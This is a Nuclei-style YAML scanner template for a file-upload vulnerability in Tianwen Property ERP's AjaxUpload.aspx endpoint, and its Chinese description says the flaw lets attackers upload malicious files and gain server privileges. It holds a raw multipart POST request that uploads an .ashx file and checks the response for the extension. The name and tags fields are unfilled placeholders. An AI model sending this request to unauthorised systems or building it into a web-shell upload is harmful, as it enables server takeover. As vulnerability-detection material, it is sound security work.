id: tianwenwuye-erp-AjaxUpload-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 成都天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案。天问物业ERP系统AjaxUpload.aspx存在文件上传漏洞，攻击者可以利用漏洞上传恶意文件获取服务器权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/T2-3%E5%A4%A9%E9%97%AE-%E7%89%A9%E4%B8%9AERP%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=t2-3%e5%a4%a9%e9%97%ae-%e7%89%a9%e4%b8%9aerp%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
  tags: tags
http:
  - raw:
      - |
        POST /HM/M_Main/AjaxUpload.aspx HTTP/1.1
        Content-Type: multipart/form-data; boundary=00content0boundary00
        User-Agent: Java/1.8.0_381
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Length: 125
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="UpFileData"; filename="1.ashx"

        1
        --00content0boundary00--
    matchers:
      - type: word
        part: body
        words:
          - '.ashx'
